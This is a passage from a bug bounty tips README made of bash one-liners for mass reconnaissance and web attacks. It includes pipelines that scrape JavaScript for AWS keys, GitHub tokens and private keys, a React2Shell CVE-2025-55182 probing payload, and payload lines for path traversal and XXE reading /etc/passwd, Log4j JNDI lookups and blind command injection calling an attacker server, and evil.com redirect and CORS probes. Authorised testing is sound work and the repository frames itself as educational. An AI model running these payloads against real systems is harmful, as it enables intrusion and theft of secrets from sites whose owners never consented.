DOMAIN="target.com"; DATE=$(date +%Y%m%d); mkdir -p recon_$DATE; cd recon_$DATE; subfinder -d $DOMAIN -all -silent | anew subs_$DATE.txt; cat subs_$DATE.txt | httpx -silent -threads 200 -o alive_$DATE.txt; cat alive_$DATE.txt | nuclei -t exposures/ -silent -o new_exposures_$DATE.txt; diff ../recon_$(date -d "yesterday" +%Y%m%d)/subs_*.txt subs_$DATE.txt 2>/dev/null | grep ">" | awk '{print $2}' > new_subs_$DATE.txt; [ -s new_subs_$DATE.txt ] && notify -silent -bulk < new_subs_$DATE.txt
```
> Full persistent recon pipeline - detects new assets daily and sends notifications

> **🎯 Pro Tip:** Run oneliner #10 via cron for 24/7 monitoring: `0 */6 * * * /path/to/recon_monitor.sh`

---

### ⚡🔥⚡ JavaScript Endpoint Extraction - Elite Techniques 2026 ⚡🔥⚡

> **🎯 10 Oneliners to extract endpoints, secrets and hidden APIs from JavaScript files! 🎯**

#### ⚡ 1. Mass JS File Discovery + Download Pipeline
```bash
cat alive.txt | katana -silent -em js -jc -d 3 | grep -E "\.js(\?|$)" | httpx -silent -mc 200 -content-length | awk '$NF > 500 {print $1}' | anew js_files.txt && cat js_files.txt | xargs -P 30 -I{} sh -c 'curl -sk {} -o js_downloaded/$(echo {} | md5sum | cut -d" " -f1).js 2>/dev/null'
```
> Discovers all JS files with Katana, filters by size (>500 bytes), downloads for offline analysis

#### ⚡ 2. Extract All API Endpoints from JS Files
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null' | grep -oE '["'"'"'](\/[a-zA-Z0-9_\-\.\/]+(\?[a-zA-Z0-9_\-\.=&]+)?)['"'"'"]' | sed 's/[\"'"'"']//g' | sort -u | grep -E "^/" | grep -vE "\.(css|png|jpg|svg|gif|woff|ico)$" | anew js_endpoints.txt
```
> Extracts all relative API paths from JavaScript, filters static assets

#### ⚡ 3. AWS Keys Hunter in JS Files
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "(AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}" && echo "Found in: {}"' | tee aws_keys_js.txt
```
> Hunts for AWS Access Key IDs (AKIA, ABIA, ACCA, ASIA patterns)

#### ⚡ 4. Google API Keys + Firebase URLs Extractor
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "(AIza[0-9A-Za-z_-]{35}|[a-z0-9-]+\.firebaseio\.com|[a-z0-9-]+\.firebaseapp\.com)" && echo "[SOURCE] {}"' | tee google_firebase_keys.txt
```
> Extracts Google API keys and Firebase database/app URLs

#### ⚡ 5. S3 Bucket Discovery in JavaScript
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "([a-zA-Z0-9_-]+\.s3\.amazonaws\.com|s3\.amazonaws\.com\/[a-zA-Z0-9_-]+|[a-zA-Z0-9_-]+\.s3\.[a-z0-9-]+\.amazonaws\.com)" | sort -u' | anew s3_buckets_js.txt && cat s3_buckets_js.txt | xargs -I{} sh -c 'curl -sI https://{} 2>/dev/null | head -1 | grep -qE "200|403" && echo "[ACCESSIBLE] {}"'
```
> Finds S3 buckets in JS and validates accessibility

#### ⚡ 6. Internal IP Addresses Leakage
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})" && echo "[SOURCE] {}"' | sort -u | tee internal_ips_js.txt
```
> Discovers internal/private IP addresses leaked in JavaScript (10.x, 172.16-31.x, 192.168.x)

#### ⚡ 7. Slack Webhooks + Discord Tokens in JS
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "(https://hooks\.slack\.com/services/[A-Za-z0-9/]+|[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27})" && echo "[SOURCE] {}"' | tee slack_discord_js.txt
```
> Extracts Slack webhook URLs and Discord bot tokens

#### ⚡ 8. GitHub Tokens + Private Keys Detection
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghu_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|ghr_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}|-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)" && echo "[SOURCE] {}"' | tee github_privkeys_js.txt
```
> Finds GitHub personal access tokens (all formats) and private key headers

#### ⚡ 9. Email Addresses + Hidden Subdomains in JS
```bash
cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u' | anew emails_js.txt && cat js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} 2>/dev/null | grep -oE "https?://[a-zA-Z0-9._-]+\.target\.com[a-zA-Z0-9./?=_-]*"' | unfurl domains | sort -u | anew hidden_subdomains_js.txt
```
> Extracts email addresses and hidden subdomains referenced in JavaScript

#### ⚡ 10. Full JS Recon Pipeline (All-in-One)
```bash
TARGET="target.com"; mkdir -p js_recon_$TARGET && cat alive.txt | katana -silent -em js -jc -d 3 | grep -iE "\.js(\?|$)" | httpx -silent -mc 200 | anew js_recon_$TARGET/js_urls.txt && cat js_recon_$TARGET/js_urls.txt | xargs -P 30 -I{} sh -c 'curl -sk {} 2>/dev/null | tee -a js_recon_$TARGET/all_js.txt' && grep -oE "(AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}" js_recon_$TARGET/all_js.txt > js_recon_$TARGET/aws_keys.txt; grep -oE "AIza[0-9A-Za-z_-]{35}" js_recon_$TARGET/all_js.txt > js_recon_$TARGET/google_keys.txt; grep -oE "ghp_[a-zA-Z0-9]{36}" js_recon_$TARGET/all_js.txt > js_recon_$TARGET/github_tokens.txt; grep -oE '["'"'"']/[a-zA-Z0-9_/-]+["'"'"']' js_recon_$TARGET/all_js.txt | tr -d '\"'"'"'' | sort -u > js_recon_$TARGET/endpoints.txt; echo "[+] JS Recon Complete! Check js_recon_$TARGET/"
```
> Complete JS recon pipeline: discovers JS files, downloads all, extracts AWS/Google/GitHub keys and API endpoints

> **🎯 Pro Tip:** Use `nuclei -t exposures/tokens/` on discovered secrets to validate if they're active!

---

## 🆕 Oneliners 2024-2025

### ⚡🔥⚡ React2Shell - CVE-2025-55182 (CVSS 10.0 - CRITICAL) ⚡🔥⚡

> **💀 Critical RCE in React Server Components & Next.js - Under active exploitation! Added to CISA KEV 💀**

#### ⚡ Detect Next.js Apps (Recon First)
```bash
cat alive.txt | httpx -silent -match-string "/_next/" -match-string "__NEXT_DATA__" | anew nextjs_targets.txt
```

#### ⚡ Check if Next-Action Header is Accepted
```bash
curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com -H "Next-Action: test" -H "Content-Type: text/plain" --data '0'
```

#### ⚡ Mass Detection - Next-Action Header Accepted
```bash
cat alive.txt | xargs -I@ -P20 sh -c 'RES=$(curl -s -o /dev/null -w "%{http_code}" -X POST @ -H "Next-Action: x" --data "0" 2>/dev/null); [ "$RES" != "404" ] && [ "$RES" != "000" ] && echo "POTENTIALLY VULN: @ [$RES]"' | tee react2shell_candidates.txt
```

#### ⚡ Create Payload Files for Testing
```bash
# Create payload.json (safe math check - no RCE)
echo '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"7*7","_formData":{"get":"$1:constructor:constructor"}}}' > payload.json && echo '"$@0"' > trigger.txt
```

#### ⚡ Manual Vulnerability Check with cURL
```bash
curl -X POST https://target.com -H "Next-Action: check" -F "0=@payload.json" -F "1=@trigger.txt" --max-time 5 -v 2>&1 | grep -iE "(49|error|stack|trace)"
```

#### ⚡ One-liner: Full Detection Pipeline
```bash
subfinder -d target.com -silent | httpx -silent | while read url; do CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -H "Next-Action: x" -H "Content-Type: text/plain" --data "0" 2>/dev/null); [[ "$CODE" =~ ^(200|400|500)$ ]] && echo "[NEXT-ACTION ACCEPTED] $url - HTTP $CODE"; done | tee nextjs_react2shell.txt
```

#### ⚡ Detect Vulnerable Response Headers
```bash
cat nextjs_targets.txt | xargs -I@ -P10 sh -c 'curl -s -I -X POST @ -H "Next-Action: test" 2>/dev/null | grep -qi "x-action-redirect" && echo "VULN INDICATOR: @"'
```

#### ⚡ Mass Scan with httpx + Next-Action Probe
```bash
cat alive.txt | httpx -silent -method POST -H "Next-Action: probe" -mc 200,400,500 -title -tech-detect | grep -i "next" | anew react2shell_potential.txt
```

#### ⚡ Shodan Dork for Next.js Targets
```bash
shodan search "X-Powered-By: Next.js" --fields ip_str,port,hostnames | awk '{print "https://"$1":"$2}' | httpx -silent | anew shodan_nextjs.txt
```

#### ⚡ Nuclei Template Check
```bash
nuclei -l nextjs_targets.txt -t http/cves/2025/CVE-2025-55182.yaml -c 30 -o react2shell_nuclei.txt
```

#### ⚡ Find & Test - Complete One-liner
```bash
subfinder -d target.com -silent | httpx -silent -match-string "/_next/" | tee nextjs.txt | xargs -I@ -P15 sh -c 'R=$(curl -s -w "\n%{http_code}" -X POST @ -H "Next-Action: x" --data "test" 2>/dev/null | tail -1); [ "$R" = "200" ] || [ "$R" = "400" ] && echo "[!] REACT2SHELL CANDIDATE: @"' | anew vuln_candidates.txt
```

#### ⚡ Check RSC Endpoint Directly
```bash
curl -s -X POST "https://target.com/" -H "Next-Action: whatever" -H "Content-Type: multipart/form-data; boundary=----FormBoundary" --data-binary $'------FormBoundary\r\nContent-Disposition: form-data; name="0"\r\n\r\ntest\r\n------FormBoundary--' | head -c 500
```

#### ⚡ Batch Test from File with Parallel
```bash
cat urls.txt | parallel -j20 'curl -s -o /dev/null -w "{} - %{http_code}\n" -X POST {} -H "Next-Action: test" --data "0" 2>/dev/null' | grep -E " - (200|400|500)$" | tee react2shell_batch.txt
```

> **⚠️ Affected:** React 19.0.0-19.2.0, Next.js 15.0.4-16.0.6 | **✅ Fix:** Update to React 19.0.1/19.1.2/19.2.1
>
> **🎯 Key Detection:** Apps accepting `Next-Action` header + RSC deserialization = Potential RCE

---

### Nuclei DAST XSS
```bash
echo "https://target.com" | nuclei -dast -t dast/vulnerabilities/xss/ -rl 5
```

### Open Redirect Mass
```bash
cat urls.txt | gf redirect | qsreplace "https://evil.com" | httpx -silent -location | grep "evil.com"
```

### CORS Misconfiguration
```bash
cat urls.txt | httpx -silent -H "Origin: https://evil.com" -match-string "evil.com" | anew cors_vuln.txt
```

### Host Header Injection
```bash
cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -match-string "evil.com"
```

### CRLF Injection
```bash
cat urls.txt | qsreplace "%0d%0aX-Injected: header" | httpx -silent -match-string "X-Injected"
```

### Prototype Pollution
```bash
cat js.txt | xargs -I@ curl -s @ | grep -E "(__proto__|constructor\.prototype)" | anew proto_pollution.txt
```

### Cache Poisoning Detection
```bash
cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Original-URL: /admin" -mc 200
```

### IDOR Pattern Detection
```bash
cat urls.txt | grep -oE "(id|user|account|uid|pid)=[0-9]+" | sort -u | anew idor_candidates.txt
```

### Race Condition URLs
```bash
cat urls.txt | grep -iE "(redeem|coupon|vote|like|follow|transfer|withdraw)" | anew race_condition.txt
```

### WebSocket Endpoints
```bash
cat urls.txt | grep -iE "(socket|ws://|wss://)" | anew websocket.txt
```

### Path Traversal
```bash
cat urls.txt | gf lfi | qsreplace "....//....//....//etc/passwd" | httpx -silent -match-string "root:x"
```

### XXE Detection
```bash
cat urls.txt | grep -iE "\.(xml|soap)" | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Log4j Scan
```bash
cat urls.txt | qsreplace '${jndi:ldap://YOURSERVER/a}' | httpx -silent -H 'X-Api-Version: ${jndi:ldap://YOURSERVER/a}'
```

### Blind Command Injection
```bash
cat urls.txt | qsreplace "\`curl YOURSERVER\`" | httpx -silent
cat urls.txt | qsreplace "| curl YOURSERVER" | httpx -silent
```

### Mass Screenshot
```bash
cat alive.txt | xargs -I@ gowitness single @ -o screenshots/
```

### Technology Detection
```bash
cat alive.txt | httpx -silent -tech-detect -status-code -title | anew tech_stack.txt
```

### Favicon Hash (Shodan)
```bash
curl -s https://target.com/favicon.ico | md5sum | awk '{print $1}'
```

### Exposed Admin Panels
```bash
cat alive.txt | httpx -silent -path /admin,/administrator,/admin.php,/wp-admin,/manager,/phpmyadmin -mc 200,301,302 | anew admin_panels.txt
```

### Debug Endpoints
```bash
cat alive.txt | httpx -silent -path /debug,/trace,/actuator,/metrics,/health,/info -mc 200 | anew debug_endpoints.txt
```

### Spring Boot Actuators
```bash
cat alive.txt | httpx -silent -path /actuator/env,/actuator/heapdump,/actuator/mappings -mc 200 | anew spring_actuators.txt
```

### WordPress Enumeration
```bash
cat alive.txt | httpx -silent -path /wp-json/wp/v2/users -mc 200 | anew wp_users.txt
```

### Laravel Debug Mode
```bash
cat alive.txt | httpx -silent -match-string "Whoops" -match-string "Laravel" | anew laravel_debug.txt
```

### Django Debug
```bash
cat alive.txt | httpx -silent -match-string "Django" -match-string "DEBUG" | anew django_debug.txt
```

### HTTP Request Smuggling
```bash
cat alive.txt | python3 smuggler.py -q 2>/dev/null | anew smuggling.txt
```

### CSP Bypass Check
```bash
cat alive.txt | httpx -silent -include-response-header | grep -i "content-security-policy" | anew csp_headers.txt
```

### Subdomain from Favicon
```bash
curl -s https://target.com/favicon.ico | python3 -c "import mmh3,sys,codecs;print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),'base64')))"
```

---

## 🔍 Search Engines for Hackers

| Engine | Link | Description |
|:------:|:----:|:-----------:|
| **Shodan** | [shodan.io](https://shodan.io) | IoT & device search |
| **Censys** | [censys.io](https://censys.io) | Internet scan data |
| **Fofa** | [fofa.info](https://en.fofa.info) | Cyberspace search |
| **ZoomEye** | [zoomeye.org](https://zoomeye.org) | Cyberspace mapping |
| **Hunter** | [hunter.how](https://hunter.how) | Asset discovery |
| **Netlas** | [netlas.io](https://netlas.io) | Attack surface |
| **GreyNoise** | [greynoise.io](https://viz.greynoise.io) | Internet scanners |
| **Onyphe** | [onyphe.io](https://onyphe.io) | Cyber defense |
| **CriminalIP** | [criminalip.io](https://criminalip.io) | Threat intel |
| **FullHunt** | [fullhunt.io](https://fullhunt.io) | Attack surface |
| **Quake** | [quake.360.net](https://quake.360.net) | Cyberspace search |
| **Leakix** | [leakix.net](https://leakix.net) | Leak detection |
| **URLScan** | [urlscan.io](https://urlscan.io) | URL analysis |
| **DNSDumpster** | [dnsdumpster.com](https://dnsdumpster.com) | DNS recon |
| **crt.sh** | [crt.sh](https://crt.sh) | Certificate search |
| **SecurityTrails** | [securitytrails.com](https://securitytrails.com) | DNS history |
| **Pulsedive** | [pulsedive.com](https://pulsedive.com) | Threat intel |
| **VirusTotal** | [virustotal.com](https://virustotal.com) | File/URL analysis |
| **PublicWWW** | [publicwww.com](https://publicwww.com) | Source code search |
| **Grep.app** | [grep.app](https://grep.app) | GitHub code search |

---

## 📖 Recommended Wordlists

| Wordlist | Link | Use Case |
|:---------|:----:|:---------|
| **SecLists** | [GitHub](https://github.com/danielmiessler/SecLists) | Everything |
| **FuzzDB** | [GitHub](https://github.com/fuzzdb-project/fuzzdb) | Fuzzing |
| **Assetnote** | [wordlists.assetnote.io](https://wordlists.assetnote.io) | Web content |
| **OneListForAll** | [GitHub](https://github.com/six2dez/OneListForAll) | Combined |
| **jhaddix all.txt** | [GitHub](https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056) | Directories |
| **commonspeak2** | [GitHub](https://github.com/assetnote/commonspeak2-wordlists) | Real-world |

---

## 📚 Learning Resources

### Books
- Web Application Hacker's Handbook
- Real-World Bug Hunting by Peter Yaworski
- Bug Bounty Bootcamp by Vickie Li

### Platforms
- [HackerOne](https://hackerone.com)
- [Bugcrowd](https://bugcrowd.com)
- [Intigriti](https://intigriti.com)
- [YesWeHack](https://yeswehack.com)

### Practice
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PentesterLab](https://pentesterlab.com)
- [HackTheBox](https://hackthebox.com)
- [TryHackMe](https://tryhackme.com)

### Blogs & Resources
- [PortSwigger Research](https://portswigger.net/research)
- [ProjectDiscovery Blog](https://blog.projectdiscovery.io)
- [Assetnote Blog](https://blog.assetnote.io)

---

## 🙏 Special Thanks

<div align="center">

| Hunter | Hunter | Hunter |
|:------:|:------:|:------:|
| [@bt0s3c](https://twitter.com/bt0s3c) | [@MrCl0wnLab](https://twitter.com/MrCl0wnLab) | [@stokfredrik](https://twitter.com/stokfredrik) |
| [@Jhaddix](https://twitter.com/Jhaddix) | [@TomNomNom](https://twitter.com/TomNomNom) | [@NahamSec](https://twitter.com/NahamSec) |
| [@zseano](https://twitter.com/zseano) | [@pry0cc](https://twitter.com/pry0cc) | [@pdiscoveryio](https://twitter.com/pdiscoveryio) |
| [@jeff_foley](https://twitter.com/jeff_foley) | [@haaborern](https://twitter.com/haaborern) | [@0xacb](https://twitter.com/0xacb) |

</div>

---

## 🤝 Contributing

<div align="center">

We welcome contributions from the community! Your expertise makes this repository better.

[![Contributors](https://img.shields.io/github/contributors/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&color=blue)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/graphs/contributors)
[![Pull Requests](https://img.shields.io/github/issues-pr/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&color=green)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/pulls)
[![Issues](https://img.shields.io/github/issues/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&color=orange)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/issues)

</div>

### 💡 How to Contribute

<details>
<summary><b>📝 Click to see contribution guidelines</b></summary>

<br>

1. **Fork the Repository**
   ```bash
   git clone https://github.com/KingOfBugbounty/KingOfBugBountyTips.git
   cd KingOfBugBountyTips
   ```

2. **Create a New Branch**
   ```bash
   git checkout -b feature/your-contribution
   ```

3. **Add Your Content**
   - Add new one-liners with proper documentation
   - Include source references and explanations
   - Follow the existing format and structure

4. **Submit Pull Request**
   - Write a clear description of your changes
   - Reference any related issues
   - Wait for review and feedback

### ✨ What to Contribute

- 🎯 New bug bounty one-liners and techniques
- 🔧 Tool installation guides and tips
- 📚 Additional resources and references
- 🐛 Bug fixes and improvements
- 📖 Documentation enhancements
- 🌐 Translations to other languages

</details>

---

## 📊 Repository Analytics

<div align="center">

<table>
  <tr>
    <td align="center">
      <img src="https://img.shields.io/github/stars/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&logo=github&color=yellow" alt="Stars"><br>
      <b>Stars</b>
    </td>
    <td align="center">
      <img src="https://img.shields.io/github/forks/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&logo=github&color=blue" alt="Forks"><br>
      <b>Forks</b>
    </td>
    <td align="center">
      <img src="https://img.shields.io/github/watchers/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&logo=github&color=green" alt="Watchers"><br>
      <b>Watchers</b>
    </td>
    <td align="center">
      <img src="https://img.shields.io/github/contributors/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&logo=github&color=orange" alt="Contributors"><br>
      <b>Contributors</b>
    </td>
  </tr>
</table>

### 📈 Growth Chart

[![Star History Chart](https://api.star-history.com/svg?repos=KingOfBugbounty/KingOfBugBountyTips&type=Date)](https://star-history.com/#KingOfBugbounty/KingOfBugBountyTips&Date)

</div>

---

## 💖 Support the Project

<div align="center">

If this repository helped you in your bug bounty journey, consider supporting the project!

<a href="https://www.buymeacoffee.com/OFJAAAH" target="_blank">
  <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" width="200">
</a>

### ⭐ Show Your Support

Give this repository a star if you found it helpful!

[![GitHub stars](https://img.shields.io/github/stars/KingOfBugbounty/KingOfBugBountyTips?style=social)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/stargazers)

</div>

---

## 📜 License & Legal

<div align="center">

[![License](https://img.shields.io/github/license/KingOfBugbounty/KingOfBugBountyTips?style=for-the-badge&color=blue)](LICENSE)

<p>
  <img src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?style=for-the-badge&logo=gnubash&logoColor=white">
  <img src="https://img.shields.io/badge/Made%20with-Go-00ADD8.svg?style=for-the-badge&logo=go&logoColor=white">
  <img src="https://img.shields.io/badge/Made%20with-Python-3776AB.svg?style=for-the-badge&logo=python&logoColor=white">
  <img src="https://img.shields.io/badge/Made%20with-%E2%9D%A4-red?style=for-the-badge">
</p>

</div>

### ⚠️ Important Disclaimer

<div align="center">

```ascii
╔═══════════════════════════════════════════════════════════════╗
║                    ⚠️  LEGAL NOTICE ⚠️                        ║
╠═══════════════════════════════════════════════════════════════╣
║  This repository is for EDUCATIONAL PURPOSES ONLY             ║
║                                                                ║
║  ✅ DO: Use for authorized security testing                   ║
║  ✅ DO: Learn and understand the techniques                   ║
║  ✅ DO: Contribute and share knowledge                        ║
║                                                                ║
║  ❌ DON'T: Use for unauthorized testing                       ║
║  ❌ DON'T: Use for malicious purposes                         ║
║  ❌ DON'T: Violate laws or regulations                        ║
║                                                                ║
║  The authors are NOT responsible for any misuse or damage     ║
║  caused by this information. Always test responsibly!         ║
╚═══════════════════════════════════════════════════════════════╝
```

</div>

---

## 🔗 Quick Links & Resources

<div align="center">

| Resource | Link |
|:---------|:-----|
| 🏠 **Homepage** | [King of Bug Bounty Tips](https://github.com/KingOfBugbounty/KingOfBugBountyTips) |
| 🛠️ **KingRecon DOD** | [Automated Recon Tool](https://github.com/KingOfBugbounty/KingRecon_DOD) |
| 🐧 **BugBuntu OS** | [Download Here](https://sourceforge.net/projects/bugbuntu/) |
| 📺 **YouTube Channel** | [OFJAAAH](https://www.youtube.com/c/OFJAAAH) |
| 💬 **Telegram Group** | [Join Community](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA) |
| 🐦 **Twitter/X** | [@ofjaaah](https://twitter.com/ofjaaah) |
| 💼 **LinkedIn** | [Connect](https://www.linkedin.com/in/atjunior/) |
| 🐛 **Report Issues** | [GitHub Issues](https://github.com/KingOfBugbounty/KingOfBugBountyTips/issues) |
| 🔐 **Security Issues** | [Security Advisory](https://github.com/KingOfBugbounty/KingOfBugBountyTips/security/advisories/new) |

</div>

---

<div align="center">

### 🌟 Special Thanks

To all contributors, bug bounty hunters, and the security community who make this project possible!

---

**Last Updated:** January 2026 | **Version:** 4.5

<img src="https://img.shields.io/badge/Maintained-Yes-success?style=for-the-badge">
<img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge">
<img src="https://img.shields.io/badge/Community-Growing-blue?style=for-the-badge">

<br><br>

```ascii
╔══════════════════════════════════════════════════════════════════╗
║          "Stay curious, stay ethical, stay hungry" 🏴‍☠️          ║
║                  Happy Hunting! 💀                               ║
╚══════════════════════════════════════════════════════════════════╝
```

<br>

**Made with ❤️ by the Bug Bounty Community**

</div>
